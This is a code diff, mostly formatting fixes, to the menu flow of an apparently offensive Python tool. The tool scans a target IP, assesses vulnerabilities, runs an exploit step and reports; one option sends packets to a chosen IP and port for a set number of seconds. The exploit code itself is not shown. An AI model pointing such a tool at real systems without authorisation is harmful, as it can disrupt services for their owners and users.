@@ -9,17 +9,19 @@ from py_console import console
 from modules.ultilities import ip_valid
 import sys
 
+
 def continue_step(menu):
     choice = continue_menu()
     if choice == 1:
         main_flow(menu)
     if choice == 2:
         clear.clrscr()
-        welcome_screen.banner('','',term_size.get_terminal_size("width"))
+        welcome_screen.banner('', '', term_size.get_terminal_size("width"))
         main_flow(print_menu())
     else:
         clear.clrscr()
         print('See you again!!!')
+
 
 def main_flow(choice):
     if (choice == 1):
@@ -28,8 +30,8 @@ def main_flow(choice):
             validated_data = ip_valid.validator(ip)
             scandata = scanning(validated_data)
             vulndata = vulnassesst(ip, scandata)
-            exploit()
-            report(scandata,vulndata)
+            exploit(ip, 80, 10)
+            report(scandata, vulndata)
             console.success("Running cycle complete successfully!")
             continue_step(choice)
         except Exception as e:
@@ -84,7 +86,7 @@ def main_flow(choice):
             ip = str(input('Target IP: '))
             port = int(input('Port: '))
             duration = int(input('Number of seconds to send packets: '))
-            exploit(ip,port,duration)
+            exploit(ip, port, duration)
             continue_step(choice)
         except Exception as e:
             console.error("An Error Occurred!!!")
